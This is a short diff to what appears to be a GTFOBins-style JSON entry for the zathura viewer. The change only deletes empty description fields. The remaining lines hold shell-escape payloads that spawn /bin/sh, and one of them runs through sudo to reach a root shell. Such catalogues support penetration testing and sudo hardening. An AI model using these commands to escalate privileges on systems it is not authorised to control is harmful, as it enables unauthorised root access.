@@ -2,13 +2,13 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
       }
     ]
